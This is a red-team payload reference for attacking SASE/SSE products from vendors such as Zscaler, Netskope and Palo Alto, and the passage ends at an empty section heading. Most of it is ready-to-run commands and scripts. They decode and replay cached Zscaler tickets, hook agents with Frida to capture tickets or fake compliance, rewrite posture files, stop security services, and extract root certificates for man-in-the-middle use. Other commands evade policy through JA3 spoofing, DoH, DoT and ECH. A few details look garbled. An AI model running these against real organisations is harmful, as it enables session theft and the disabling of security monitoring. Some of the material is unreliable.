# SASE / SSE Attack Payloads

> Companion to `SKILL.md`, organized into 14 sections covering all 7 major SASE/SSE vendors (Zscaler, Netskope, Palo Alto Prisma Access, Cisco Umbrella, CATO Networks, Cloudflare One, Microsoft Entra Global Secure Access) and the cross-cutting techniques (client connector reverse engineering, TLS inspection bypass, split-tunnel abuse, anonymizer proxy evasion, identity-based bypass).
>
> **All commands assume authorized lab / red team scope.** Replace `REPLACE_WITH_YOUR_X` placeholders with your tenant IDs, client IDs, agent paths, certificate paths, and tokens.
>
> **Vendors referenced**: Zscaler (ZIA / ZPA / ZDX / Client Connector), Netskope (Security Cloud, SWG, CASB, Private Access), Palo Alto Prisma Access (GlobalProtect, Cloud Service Plugin), Cisco Umbrella (Roaming Client, SmartProxy, SIG), CATO Networks (SSE, SASE Socket), Cloudflare One (WARP, Gateway, Access, Tunnel), Microsoft Entra Global Secure Access (Private Access, Internet Access, Traffic Forwarding).
>
> **Cross-cutting references**: `cloud-identity-attack` (for IdP token theft patterns), `network-tunneling-proxy` (for generic tunneling), `network-sniffing-mitm` (for TLS MitM techniques).

---

## Table of Contents

1. [SSE Vendor Fingerprinting](#1-sse-vendor-fingerprinting)
2. [SSE Tenant & Admin Surface Enumeration](#2-sse-tenant--admin-surface-enumeration)
3. [Zscaler Client Connector Reverse Engineering](#3-zscaler-client-connector-reverse-engineering)
4. [Netskope Client Bypass (MACE / App-Specific Routing / TLS Fingerprint)](#4-netskope-client-bypass)
5. [TLS Inspection Bypass (Pinning / ECH / DoH / DoT)](#5-tls-inspection-bypass)
6. [Split-Tunnel Race Conditions (Zscaler, Palo Alto, Cisco)](#6-split-tunnel-race-conditions)
7. [Cisco Umbrella Roaming Client Bypass](#7-cisco-umbrella-roaming-client-bypass)
8. [CATO Networks SASE Socket Takeover](#8-cato-networks-sase-socket-takeover)
9. [Cloudflare One / Zero Trust Bypass (WARP / Gateway / Access / Tunnel)](#9-cloudflare-one--zero-trust-bypass)
10. [Microsoft Entra Global Secure Access Bypass](#10-microsoft-entra-global-secure-access-bypass)
11. [Anonymizer Proxy Evasion (Shadowsocks / V2Ray / Obfs4 / Trojan)](#11-anonymizer-proxy-evasion)
12. [Stolen SSO Token Replay Through SSE](#12-stolen-sso-token-replay-through-sse)
13. [ZPA App Connector & Service Edge Compromise](#13-zpa-app-connector--service-edge-compromise)
14. [Detection Avoidance & Post-Engagement Cleanup](#14-detection-avoidance--post-engagement-cleanup)

---

## 1. SSE Vendor Fingerprinting

Identify which SASE/SSE vendor is deployed on an endpoint or network, without privileged access.

### 1.1 macOS: Inspect System Trust Store for SSE Root Cert

```bash
# Search the System keychain for SSE-vendor root certs
security find-certificate -a -c 'Zscaler' /Library/Keychains/System.keychain 2>&1 | head -10
security find-certificate -a -c 'Netskope' /Library/Keychains/System.keychain 2>&1 | head -10
security find-certificate -a -c 'Palo Alto' /Library/Keychains/System.keychain 2>&1 | head -10
security find-certificate -a -c 'Cisco' /Library/Keychains/System.keychain 2>&1 | head -10
security find-certificate -a -c 'CATO' /Library/Keychains/System.keychain 2>&1 | head -10
security find-certificate -a -c 'Cloudflare' /Library/Keychains/System.keychain 2>&1 | head -10
security find-certificate -a -c 'Microsoft' /Library/Keychains/System.keychain 2>&1 | head -10

# Dump full certificate details for any match
security find-certificate -a -c 'Zscaler' -p /Library/Keychains/System.keychain 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates -fingerprint -sha256
```

### 1.2 Windows: Inspect Trust Store via certutil / PowerShell

```powershell
# Search the LocalMachine Trusted Root for SSE-vendor certs
certutil -store Root | findstr /I "Zscaler Netskope Palo Cisco CATO Cloudflare Microsoft"

# PowerShell equivalent with full detail
Get-ChildItem -Path Cert:\LocalMachine\Root | Where-Object {
    $_.Subject -match 'Zscaler|Netskope|Palo Alto|Cisco|CATO|Cloudflare|Microsoft'
} | Select-Object Subject, Issuer, NotBefore, NotAfter, Thumbprint

# Also check the Intermediate CA store (SSE sometimes installs as intermediate)
Get-ChildItem -Path Cert:\LocalMachine\CA | Where-Object {
    $_.Subject -match 'Zscaler|Netskope|Palo Alto|Cisco|CATO|Cloudflare'
} | Select-Object Subject, Issuer, Thumbprint
```

### 1.3 Linux: Inspect Trust Store

```bash
# Common trust store locations
ls -la /etc/ssl/certs/ | grep -iE 'zscaler|netskope|palo|cisco|cato|cloudflare|microsoft'
ls -la /usr/local/share/ca-certificates/ | grep -iE 'zscaler|netskope|palo|cisco|cato|cloudflare'
ls -la /etc/pki/ca-trust/source/anchors/ 2>/dev/null | grep -iE 'zscaler|netskope|palo|cisco|cato|cloudflare'

# Inspect any found cert
openssl x509 -in /etc/ssl/certs/zscaler-root-ca.pem -noout -subject -issuer -dates -fingerprint -sha256 2>/dev/null
```

### 1.4 Process Inspection (Cross-Platform)

```bash
# macOS / Linux: list running agent processes
ps -axo pid,comm | grep -iE 'zsagent|zscaler|nspa|netskope|pangpa|globalprotect|umbrella|cato|cloudflare|warp|gsa|globalsecure'

# macOS: identify the agent's bundle and binary path
sudo launchctl list | grep -iE 'zscaler|netskope|paloalto|cisco|cato|cloudflare|microsoft'
ls -la /Library/LaunchDaemons/ | grep -iE 'zscaler|netskope|paloalto|cisco|cato|cloudflare|microsoft'
ls -la /Library/LaunchAgents/ | grep -iE 'zscaler|netskope|paloalto|cisco|cato|cloudflare|microsoft'

# Windows (PowerShell)
Get-Process | Where-Object {
    $_.ProcessName -match 'Zscaler|Netskope|PanGPA|PanGPS|Umbrella|CATO|Cloudflare|WARP|GSA'
} | Select-Object ProcessName, Id, Path

Get-Service | Where-Object {
    $_.Name -match 'Zscaler|Netskope|PanGPA|PanGPS|Umbrella|CATO|Cloudflare|WARP|GSA'
} | Select-Object Name, Status, DisplayName
```

### 1.5 Network Interface Inspection (Routing & TUN)

```bash
# macOS: identify the agent's TUN/utun interface
ifconfig | grep -E 'utun|tun|ipsec|cato|warp|tunnel'
netstat -rn | grep -E 'utun|tun' | head -20

# Linux: identify the agent's interface
ip link show | grep -iE 'tun|warp|cato|zsagent|netskope|pan|gsa'
ip route show table all | grep -iE 'tun|warp|cato|pan' | head -20

# Windows: routing table
route print | findstr /I "tun warp cato"
```

### 1.6 DNS Resolver Inspection

```bash
# macOS: identify the enforced DNS resolver
scutil --dns | grep 'nameserver\[' | head -10

# Linux: /etc/resolv.conf and resolved
cat /etc/resolv.conf
resolvectl status 2>/dev/null | head -20

# Windows
Get-DnsClientServerAddress | Select-Object InterfaceAlias, ServerAddresses
ipconfig /all | findstr /I "DNS Servers"
```

### 1.7 HTTPS Interception Issuer Fingerprinting

```bash
# The SSE decrypts every HTTPS flow by presenting its own leaf cert.
# Fetch any HTTPS site and inspect the issuer of the presented cert.
echo Q | openssl s_client -showcerts -connect www.example.com:443 2>/dev/null \
  | openssl x509 -noout -issuer -subject

# Vendor identification by issuer:
#   "Zscaler Root CA" → Zscaler ZIA
#   "Netskope MMD Root CA" / "Netskope TC Root CA" → Netskope Security Cloud
#   "Palo Alto Networks" / "GlobalProtect" → Prisma Access / GlobalProtect
#   "Cisco Umbrella Root CA" → Cisco Umbrella SWG
#   "CATO Root CA" → CATO Networks SSE
#   "Cloudflare" → Cloudflare Gateway
#   "Microsoft Global Secure Access Root" → Microsoft Entra GSA

# Compare to the real cert (no SSE)
# (Run from a known-clean device or a network not behind the SSE)
echo Q | openssl s_client -showcerts -connect www.example.com:443 -servername www.example.com 2>/dev/null \
  | openssl x509 -noout -issuer -subject
# Real issuer: DigiCert / Let's Encrypt / etc. — anything that is NOT the SSE vendor.
```

### 1.8 Egress IP / SSE Cloud Identification (Wireshark)

```bash
# Capture the agent's traffic to identify the SSE cloud endpoints
sudo tshark -i en0 -Y 'tls.handshake.extensions_server_name' -T fields \
  -e tls.handshake.extensions_server_name 2>/dev/null \
  | sort -u | grep -iE 'zscaler|goskope|prismaaccess|opendns|catonetworks|cloudflareaccess|globalsecureaccess|umbrella|warp'

# Identify which SNIs the agent talks to:
#   *.gateway.zscaler.net          → Zscaler ZIA forward proxy
#   *.private.zscaler.com          → Zscaler ZPA
#   *.goskope.com                  → Netskope Security Cloud
#   *.prismaaccess.com             → Palo Alto Prisma Access
#   *.umbrella.com                 → Cisco Umbrella
#   *.sdp.catonetworks.com         → CATO Networks
#   *.cloudflareaccess.com         → Cloudflare Access
#   <tenant>.globalsecureaccess.microsoft.com  → Microsoft Entra GSA
```

---

## 2. SSE Tenant & Admin Surface Enumeration

Identify the tenant name, customer ID, and admin API surface for each deployed SSE vendor. Requires authorized engagement scope.

### 2.1 Zscaler ZIA / ZPA Tenant Identification

```bash
# 1. From the agent's auth flow capture (Wireshark with SSE root installed):
sudo tshark -i en0 -Y 'tls.handshake.extensions_server_name contains "zscaler"' \
  -T fields -e tls.handshake.extensions_server_name 2>/dev/null | sort -u

# Common patterns:
#   <tenant>.gateway.zscaler.net      → ZIA forward proxy cloud
#   <tenant>.gateway.zscalerbeta.net  → ZIA Beta cloud
#   <tenant>.gateway.zscalertwo.net   → ZIA alternate cloud
#   <tenant>.gateway.zscalercloud.net → ZIA government cloud
#   config.private.zscaler.com        → ZPA cloud (same for all customers)
#   portal.private.zscaler.com        → ZPA portal
#   ns.<customer-id>.p Zac.zscaler.com → Client Connector

# 2. Admin portals:
#   ZIA: https://admin.<cloud>.net (e.g., https://admin.zscaler.net)
#   ZPA: https://admin.private.zscaler.com
#   Client Connector: https://nodetreecloud.zscaler.net

# 3. From the local cache (Zscaler Client Connector):
sudo cat /Library/Application\ Support/Zscaler/Zscaler/.zscalerinfo 2>/dev/null | jq .
# Typically returns: cloud, customer_id, username

# 4. From a low-priv user token, test the ZIA admin API endpoint existence:
ZIA_CLOUD='REPLACE_WITH_YOUR_ZIA_CLOUD'
curl -sk -o /dev/null -w '%{http_code}\n' "https://admin.$ZIA_CLOUD/api/v1/auth"
# 401/403 = endpoint exists; 404 = wrong cloud
```

### 2.2 Netskope Tenant Identification

```bash
# 1. Capture the agent's SNI:
sudo tshark -i en0 -Y 'tls.handshake.extensions_server_name contains "goskope"' \
  -T fields -e tls.handshake.extensions_server_name 2>/dev/null | sort -u

# Common patterns:
#   <tenant>.goskope.com                → Netskope cloud
#   <tenant>-gateway.goskope.com        → gateway
#   <tenant>.amo.goskope.com            → agent management

# 2. Admin portal: https://<tenant>.goskope.com

# 3. From the local Netskope client config:
sudo cat "/Library/Application Support/Netskope/STAgentUI/config/nspa.xml" 2>/dev/null | head -20
# Returns: tenant URL, deployment mode, profile

# 4. Test the admin API v2 endpoint:
TENANT='REPLACE_WITH_YOUR_TENANT'
curl -sk -o /dev/null -w '%{http_code}\n' "https://$TENANT.goskope.com/api/v2/org/health"
# 401/403 = endpoint exists
```

### 2.3 Palo Alto Prisma Access Identification

```bash
# 1. Agent SNI capture:
sudo tshark -i en0 -Y 'tls.handshake.extensions_server_name contains "prismaaccess"' \
  -T fields -e tls.handshake.extensions_server_name 2>/dev/null | sort -u

# Common patterns:
#   *.prismaaccess.com         → Prisma Access cloud
#   *.paloaltonetworks.com     → GlobalProtect portal
#   gateway.<customer>.prismaaccess.com

# 2. Admin portals:
#   Prisma Access: https://apps.paloaltonetworks.com
#   Strata Cloud Manager: https://stratacloud.paloaltonetworks.com

# 3. From the GlobalProtect agent config (macOS):
sudo cat "/Library/Preferences/com.paloaltonetworks.GlobalProtect.settings.plist" 2>/dev/null
defaults read com.paloaltonetworks.GlobalProtect.settings 2>/dev/null
# Returns: portal, user, cert

# 4. Test Prisma Access API:
curl -sk -o /dev/null -w '%{http_code}\n' \
  "https://api.sase.paloaltonetworks.com/sse/config/v1/edr-routing"
```

### 2.4 Cisco Umbrella Identification

```bash
# 1. Agent SNI / DNS patterns:
sudo tshark -i en0 -Y 'dns.qry.name contains "opendns" or tls.handshake.extensions_server_name contains "umbrella"' \
  -T fields -e dns.qry.name -e tls.handshake.extensions_server_name 2>/dev/null | sort -u

# Common patterns:
#   *.opendns.com         → Umbrella DNS resolvers (208.67.222.222, 208.67.220.220)
#   *.umbrella.com        → Umbrella mgmt
#   telemetry.umbrella.com

# 2. Admin portal: https://dashboard.umbrella.com

# 3. From the roaming client config (macOS):
sudo cat "/Library/Application Support/OpenDNS Roaming Client/config.ini" 2>/dev/null
sudo cat "/Library/Application Support/Cisco/Cisco Secure Client/config.xml" 2>/dev/null

# 4. Test Umbrella Management API:
curl -sk -o /dev/null -w '%{http_code}\n' \
  "https://management.api.umbrella.com/v1/organizations"
```

### 2.5 CATO Networks Identification

```bash
# 1. Agent SNI:
sudo tshark -i en0 -Y 'tls.handshake.extensions_server_name contains "catonetworks"' \
  -T fields -e tls.handshake.extensions_server_name 2>/dev/null | sort -u

# Common patterns:
#   *.sdp.catonetworks.com       → CATO SSE cloud
#   <account>.sdp.catonetworks.com

# 2. Admin portal: https://cato-management.sdp.catonetworks.com

# 3. From the SASE Socket config (Linux host running the socket):
sudo cat /etc/cato/cato_socket.conf 2>/dev/null
sudo cat /var/cato/config.json 2>/dev/null

# 4. Identify via ifconfig — the CATO socket creates a `cato0` or `xtun0` interface:
ip link show | grep -iE 'cato|xtun'
```

### 2.6 Cloudflare One / Zero Trust Identification

```bash
# 1. WARP agent SNI:
sudo tshark -i en0 -Y 'tls.handshake.extensions_server_name contains "cloudflare"' \
  -T fields -e tls.handshake.extensions_server_name 2>/dev/null | sort -u

# Common patterns:
#   *.cloudflareaccess.com        → Cloudflare Access
#   warp.cloudflare.com           → WARP registration
#   api.cloudflare.com            → CF API
#   <team>.cloudflareaccess.com   → team's Access

# 2. Admin portal: https://dash.cloudflare.com (team zone)

# 3. From the WARP agent config (macOS):
sudo cat "/Library/Application Support/Cloudflare/mdm-deploy.json" 2>/dev/null
defaults read com.cloudflare.warp 2>/dev/null

# 4. Test the Access API:
CF_API_TOKEN='REPLACE_WITH_YOUR_CF_API_TOKEN'
CF_ACCOUNT_ID='REPLACE_WITH_YOUR_CF_ACCOUNT_ID'
curl -sk -H "Authorization: Bearer $CF_API_TOKEN" \
  "https://api.cloudflare.com/client/v4/accounts/$CF_ACCOUNT_ID/access/apps" | jq .
```

### 2.7 Microsoft Entra Global Secure Access Identification

```bash
# 1. GSA client SNI:
sudo tshark -i en0 -Y 'tls.handshake.extensions_server_name contains "globalsecureaccess"' \
  -T fields -e tls.handshake.extensions_server_name 2>/dev/null | sort -u

# Common patterns:
#   *.globalsecureaccess.microsoft.com    → GSA cloud
#   <tenant>.globalsecureaccess.microsoft.com

# 2. Admin portal: https://entra.microsoft.com (Network Access blade)

# 3. From the GSA client config (Windows):
Get-Content "$env:PROGRAMFILES\Microsoft\Entra\Global Secure Access Client\config.json"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Entra\Global Secure Access"

# 4. Test the Microsoft Graph GSA endpoints (requires Entra ID token):
ACCESS_TOKEN='REPLACE_WITH_YOUR_ENTRA_ACCESS_TOKEN'
curl -sk -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/beta/networkAccess/forwardingProfiles" | jq .
```

---

## 3. Zscaler Client Connector Reverse Engineering

Zscaler Client Connector (formerly Zscaler App, ZSATunnel) is the agent that authenticates the user and routes traffic through Zscaler ZIA. The agent caches auth state on the endpoint and exposes IPC to the user's processes.

### 3.1 Cache File Inventory (macOS / Windows / Linux)

```bash
# macOS — Zscaler Client Connector cache
sudo find ~/Library/Application\ Support/Zscaler -type f 2>/dev/null
sudo find /Library/Application\ Support/Zscaler -type f 2>/dev/null
# Key files (paths vary by version):
#   ~/Library/Application Support/Zscaler/ZscalerClientConnector/obkey
#     → The obfuscated Zscaler Ticket (replayable to ZIA cloud)
#   ~/Library/Application Support/Zscaler/ZscalerClientConnector/zsatoken
#     → JWT-like access token
#   ~/Library/Application Support/Zscaler/ZscalerClientConnector/auditlog
#     → Local audit log
#   ~/Library/Application Support/Zscaler/ZscalerClientConnector/ZSA_config.json
#     → Agent config (forwarding rules, posture config)
#   /Library/Application Support/Zscaler/Zscaler/.zscalerinfo
#     → Tenant info (cloud, customer_id, username)

# Windows
dir /S "%APPDATA%\Zscaler"
dir /S "%PROGRAMDATA%\Zscaler"
# Key files:
#   %APPDATA%\Zscaler\ZscalerClientConnector\obkey
#   %PROGRAMDATA%\Zscaler\Zscaler\.zscalerinfo

# Linux
sudo find /opt/zscaler /home/*/.config/Zscaler -type f 2>/dev/null
```

### 3.2 Decode the obkey (Zscaler Ticket)

```bash
# The obkey is base64-encoded; decode to reveal the ticket payload
OBDIR="$HOME/Library/Application Support/Zscaler/ZscalerClientConnector"
sudo cat "$OBDIR/obkey" 2>/dev/null | base64 -d 2>/dev/null | head -c 500

# Output typically contains:
#   tenant=<cloud>.gateway.zscaler.net
#   user=<username>
#   ticket=<base64-encoded-jwt-like-string>
#   expiry=<unix-timestamp>

# Extract just the ticket
TICKET=$(sudo cat "$OBDIR/obkey" 2>/dev/null | base64 -d 2>/dev/null \
  | grep -oP 'ticket=\K[^&]+')
echo "Ticket (first 80 chars): ${TICKET:0:80}..."

# Decode the JWT-like ticket (heuristic; format varies)
echo "$TICKET" | cut -d. -f2 | base64 -d 2>/dev/null | jq . 2>/dev/null
```

### 3.3 Replay the Zscaler Ticket to Authenticate to ZIA

```bash
# Authorized lab only
ZSCALER_TICKET='REPLACE_WITH_YOUR_TICKET'
ZIA_CLOUD='REPLACE_WITH_YOUR_ZIA_CLOUD'  # e.g., gateway.zscalerbeta.net
USERNAME='REPLACE_WITH_YOUR_USERNAME'

# The ZIA auth endpoint accepts a ticket parameter
curl -s -H "Content-Type: application/json" \
  "https://$ZIA_CLOUD/api/v1/auth?ticket=$ZSCALER_TICKET&username=$USERNAME" \
  | jq .

# A successful response includes:
#   {
#     "jsessionid": "...",
#     "roles": [...],
#     "user": "...",
#     "tenants": [...]
#   }

# Use the jsessionid for subsequent ZIA API calls
JSESSIONID=$(curl -s -H "Content-Type: application/json" \
  "https://$ZIA_CLOUD/api/v1/auth?ticket=$ZSCALER_TICKET&username=$USERNAME" \
  | jq -r .jsessionid)

# Enumerate the user's policy / forward proxy rules
curl -s -H "Cookie: jsessionid=$JSESSIONID" \
  "https://$ZIA_CLOUD/api/v1/forwardingRules" | jq .
```

### 3.4 Frida Hook to Capture the Ticket at Acquisition

```bash
# Frida can hook the agent at the moment it acquires the ticket from the IdP,
# capturing the ticket before it's stored on disk.

# Discover relevant functions
frida-trace -i '*[Tt]icket*' -i '*[Aa]uth*' -n ZscalerClientConnector

# Hook the ticket acquisition function (name varies by version; discover with frida-trace)
cat > /tmp/hook-ticket.js << 'EOF'
const ticketFunc = Module.getGlobalExportByName( '_ZN20ZscalerClientConnector23acquireObkeyFromIdPEv')
  || Module.getGlobalExportByName( 'acquireTicket');

if (ticketFunc) {
  Interceptor.attach(ticketFunc, {
    onEnter(args) {
      console.log('[+] ticket acquisition called');
    },
    onLeave(retval) {
      console.log('[+] ticket acquisition returned: ' + retval);
      // Read the returned object (implementation-specific)
      try {
        const ticket = new ObjC.Object(retval);
        console.log('[+] ticket: ' + ticket.toString());
      } catch (e) {
        console.log('[+] ticket (raw): ' + retval);
      }
    }
  });
} else {
  console.log('[-] ticket function not found; enumerate with frida-trace');
}
EOF

frida -n ZscalerClientConnector -l /tmp/hook-ticket.js --no-pause
```

### 3.5 Zscaler Client Connector IPC Surface

```bash
# macOS: the agent exposes a Unix domain socket for IPC with user processes
sudo find /tmp /var/tmp /private/tmp -type s -name '*zscaler*' 2>/dev/null
sudo lsof -U | grep -i zscaler | head

# Common socket paths:
#   /tmp/.zscaler_ipc
#   /var/tmp/zsatunnel.sock
#   ~/Library/Group Containers/*.com.zscaler.zscalerclientconnector

# List the IPC messages the agent accepts (from disassembly):
# Use Hopper or Ghidra to find the dispatch table; common commands:
#   getPosture       → returns current posture
#   setLogLevel      → changes logging
#   getStatus        → returns tunnel status
#   reloadConfig     → re-reads config

# Demonstrate IPC interaction (authorized lab; message format is vendor-specific)
echo '{"command":"getStatus"}' | nc -U /tmp/.zscaler_ipc
```

### 3.6 Disable Zscaler Client Connector Locally (Persistence Prep)

```bash
# macOS: unload the agent launch daemon
sudo launchctl unload /Library/LaunchDaemons/com.zscaler.agentdaemon.plist
sudo launchctl unload /Library/LaunchAgents/com.zscaler.agent.plist

# macOS: stop the ZSATunnel (root required)
sudo killall ZSATunnel 2>/dev/null

# Windows (PowerShell as admin)
Stop-Service "ZscalerCommunicationsService" -Force
Stop-Service "ZSATunnelService" -Force

# Note: On managed devices, the MDM will redeploy the agent within minutes.
# Persistent disable requires either:
#   1. BYOD (no MDM enforcement)
#   2. Compromise of the MDM (cross-ref cloud-identity-attack)
#   3. Local registry/plist modification to mark the service as disabled
```

### 3.7 Extract Zscaler TLS Root Cert (For Off-Device Replay)

```bash
# The Zscaler root cert is the trust anchor for ZIA decryption.
# Extracting it allows installing on a non-managed device to MitM the SSE.

# macOS
security find-certificate -a -c 'Zscaler Root CA' -p /Library/Keychains/System.keychain \
  > /tmp/zscaler-root-ca.pem 2>/dev/null

# Verify the extracted cert
openssl x509 -in /tmp/zscaler-root-ca.pem -noout -subject -issuer -dates -fingerprint -sha256

# Install on another device (NOT for production; authorized lab only)
# On a separate macOS device:
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/zscaler-root-ca.pem

# Now that device trusts Zscaler's interception certs — and can be MitM'd
# by anyone with the corresponding leaf private key (which lives in the SSE cloud).
```

---

## 4. Netskope Client Bypass

Netskope Security Cloud uses the Netskope Client (formerly nspa, NSClient) which performs posture, identity, and traffic steering. MACE (Mirror Access Control Engine) classifies flows for policy.

### 4.1 Netskope Client Cache Inventory

```bash
# macOS
sudo find "/Library/Application Support/Netskope" -type f 2>/dev/null
sudo find ~/Library/Containers/com.netskope.client -type f 2>/dev/null

# Key files:
#   /Library/Application Support/Netskope/STAgentUI/config/nspa.xml
#     → Main config (tenant URL, posture, mode)
#   /Library/Application Support/Netskope/STAgentUI/heartbeat.json
#     → Posture heartbeat (domain join, EDR, disk encryption state)
#   ~/Library/Containers/com.netskope.client/Data/Library/Cookies/
#     → Auth cookies

# Windows
dir /S "%PROGRAMDATA%\Netskope"
dir /S "%APPDATA%\Netskope"

# Linux
sudo find /opt/netskope /home/*/.config/Netskope -type f 2>/dev/null
```

### 4.2 Read nspa.xml (Config + Posture)

```bash
sudo cat "/Library/Application Support/Netskope/STAgentUI/config/nspa.xml" 2>/dev/null

# Sample content:
#   <nspaconfig>
#     <tenant>REPLACE_WITH_YOUR_TENANT.goskope.com</tenant>
#     <mode>STEERAGE_ALL</mode>
#     <posture>
#       <domain_join>required</domain_join>
#       <edr>required</edr>
#       <disk_encryption>required</disk_encryption>
#     </posture>
#     <enforcement_level>strict</enforcement_level>
#   </nspaconfig>

# The enforcement_level is the posture reporter's answer. Modify to "disabled" or
# "permissive" and the client reports "compliant" regardless.
# Requires write access (root) — on BYOD, the file is often writable by the user.
```

### 4.3 Spoof Posture (Heartbeat Manipulation)

```bash
# The heartbeat.json is the periodic posture report
sudo cat "/Library/Application Support/Netskope/STAgentUI/heartbeat.json" 2>/dev/null | jq .

# Modify to always report "compliant"
sudo bash -c 'cat > "/Library/Application Support/Netskope/STAgentUI/heartbeat.json" << EOF
{
  "domain_join": true,
  "edr_running": true,
  "disk_encrypted": true,
  "os_version": "compliant",
  "posture_state": "compliant",
  "timestamp": "'$(date +%s)'"
}
EOF'

# On managed devices, the client re-checks actual state and overwrites the file.
# On BYOD without management, the file may persist.

# Frida hook approach (more robust)
cat > /tmp/netskope-posture-hook.js << 'EOF'
// Discover the posture reporter
const postureFunc = Module.getGlobalExportByName( '_ZN6Netskope12getPostureEv')
  || Module.getGlobalExportByName( 'NST_Posture_GetState');

if (postureFunc) {
  Interceptor.replace(postureFunc, new NativeCallback(() => {
    console.log('[+] Netskope posture hook fired');
    return 1;
  }, 'int', []));
}
EOF
frida -n nspa -l /tmp/netskope-posture-hook.js --no-pause
```

### 4.4 App-Specific Routing Bypass (Steerable VPN)

```bash
# Netskope "Steerable VPN" routes per-app:
#   - Apps in the "Managed" list: via Netskope cloud
#   - Apps in the "Steerable" list: direct or via Netskope, based on policy
#   - Apps not classified: direct

# Identify the app classification
sudo cat "/Library/Application Support/Netskope/STAgentUI/config/app_routing.json" 2>/dev/null | jq .

# A process not in any list goes direct. Find apps that bypass:
# 1. Enumerate running processes
# 2. Cross-reference with the routing policy
# 3. Identify apps that route direct

# Inject a process that matches a "direct" classification:
#   - Bind to a "direct" app's identity (e.g., copy the binary)
#   - Or, spawn a process that the client doesn't classify

# Example: a python script may not be classified (the client focuses on signed apps)
python3 -c "
import urllib.request
print(urllib.request.urlopen('https://blocked.example.com').read()[:100])
"
# If python3 is not in the classification list, the flow goes direct.
```

### 4.5 JA3/JA4 Spoofing against MACE

```bash
# MACE classifies flows by TLS fingerprint + HTTP/2 fingerprint + headers.
# Vanilla curl has a distinctive JA3; spoof Chrome's JA3 to bypass.

# Install curl-impersonate
brew install curl-impersonate

# Test with vanilla curl first
curl -o /dev/null -w 'vanilla: %{http_code}\n' https://blocked-by-mace.example.com/

# Test with curl-impersonate-chrome
curl_chrome116 -o /dev/null -w 'chrome-ja3: %{http_code}\n' https://blocked-by-mace.example.com/

# If vanilla returns 403 and chrome-ja3 returns 200, MACE was bypassed by JA3 spoofing.

# Python equivalent with tls-client
pip install tls-client
python3 << 'EOF'
import tls_client
session = tls_client.Session(client_identifier='chrome_120')
r = session.get('https://blocked-by-mace.example.com/')
print(f'tls-client chrome: {r.status_code}')
EOF
```

### 4.6 TLS Root Cert Theft (For Off-Device Replay)

```bash
# The Netskope TLS root cert is in the system trust store
security find-certificate -a -c 'Netskope' -p /Library/Keychains/System.keychain \
  > /tmp/netskope-root-ca.pem 2>/dev/null

# Verify
openssl x509 -in /tmp/netskope-root-ca.pem -noout -subject -issuer -fingerprint -sha256

# Combined with the user's auth cookie theft, allows full MitM from another device.
```

### 4.7 Disable Netskope Client Locally

```bash
# macOS
sudo launchctl unload /Library/LaunchDaemons/com.netskope.daemon.plist
sudo killall nspa 2>/dev/null
sudo killall stAgentUI 2>/dev/null

# Windows (PowerShell as admin)
Stop-Service "NetDefender Service" -Force
Stop-Service "Netskope Client" -Force

# Linux
sudo systemctl stop netskope-client
sudo systemctl stop netskope-tunnel
```

---

## 5. TLS Inspection Bypass

Cross-vendor techniques to defeat mandatory HTTPS interception. Apply to any SSE that decrypts via an installed root cert.

### 5.1 Certificate Pinning (Application-Layer Bypass)

```bash
# Apps that pin to the real leaf cert reject the SSE's interception cert.
# The SSE either:
#   (a) Allows the flow direct (bypass)
#   (b) Fails the flow (the app shows a cert error)

# Identify pinned apps by inspecting the SSE's bypass list
# (vendor-specific; e.g., Zscaler's "SSL Inspection Bypass" list)

# Test: visit a known-pinning site (e.g., your bank's mobile app, Apple App Store)
# - If the app works without errors, the SSE bypassed it (informational)
# - If the app shows "untrusted cert", the SSE is failing the flow

# Use pinned apps to bypass the SSE for specific destinations
# (this is the SSE vendor's intended behavior; not a vulnerability per se)
```

### 5.2 Encrypted Client Hello (ECH)

```bash
# Firefox configuration (enforce ECH)
# about:config:
#   network.dns.echconfig.enabled = true
#   network.dns.use_https_rr_as_altsvc = true
#   network.trr.uri = https://cloudflare-dns.com/dns-query
#   network.trr.mode = 3

# Chromium configuration
# chrome://flags/#encrypted-client-hello = Enabled

# Verify ECH is in use
curl -s https://tls-ech.dev/ | grep -i 'Encrypted ClientHello'

# Demonstrate bypass: visit a domain in a blocked category with ECH on and off
# - Without ECH: SSE reads SNI, applies domain policy, blocks
# - With ECH: SSE sees outer SNI (CDN/ESNI), cannot apply domain policy
```

### 5.3 DoH (DNS-over-HTTPS) to Bypass DNS-Based Policy

```bash
# Configure DoH to a non-corporate resolver

# Method 1: Browser DoH (Firefox)
# about:config:
#   network.trr.uri = https://dns.google/dns-query
#   network.trr.mode = 3  (TRR-only; no fallback to system DNS)

# Method 2: Local DoH proxy (dnscrypt-proxy)
brew install dnscrypt-proxy
cat > /opt/homebrew/etc/dnscrypt-proxy.toml << 'EOF'
server_names = ['google', 'cloudflare']
listen_addresses = ['127.0.0.1:5300']
dnscrypt_servers = false
doh_servers = true
require_dnssec = true
EOF
brew services start dnscrypt-proxy

# Set system DNS to local DoH (BYOD only; managed devices enforce DNS)
sudo networksetup -setdnsservers Wi-Fi 127.0.0.1

# Method 3: Manual DoH query (one-shot)
curl -s -H 'accept: application/dns-json' \
  'https://dns.google/resolve?name=blocked.example.com&type=A' | jq .
```

### 5.4 DoT (DNS-over-TLS) to Bypass DNS-Based Policy

```bash
# stubby is a DoT client
brew install stubby
cat > /opt/homebrew/etc/stubby/stubby.yml << 'EOF'
resolution_type: GETDNS_RESOLUTION_STUB
dns_transport_list:
  - GETDNS_TRANSPORT_TLS
upstream_recursive_servers:
  - address_data: 8.8.8.8
    tls_port: 853
    tls_auth_name: "dns.google"
  - address_data: 1.1.1.1
    tls_port: 853
    tls_auth_name: "cloudflare-dns.com"
listen_addresses:
  - 127.0.0.1
listen_port: 5300
EOF
brew services start stubby

# Configure system DNS
sudo networksetup -setdnsservers Wi-Fi 127.0.0.1

# Verify DoT is in use
dig +trace @127.0.0.1 example.com
```

### 5.5 ESNI (Encrypted Server Name Indication — Legacy Pre-ECH)

```bash
# ESNI is the predecessor to ECH (RFC 8446 appendix; deprecated in favor of ECH).
# Some older clients still support ESNI; behavior is similar.

# Firefox (versions 70-89, before ECH replaced ESNI)
# about:config:
#   network.security.esni.enabled = true

# Test sites that support ESNI:
curl -s https://crypto.mozilla.org/cdn-cgi/trace | grep -i 'ESNI\|ECH'
```

### 5.6 QUIC / HTTP/3 to Bypass SWG Inspection

```bash
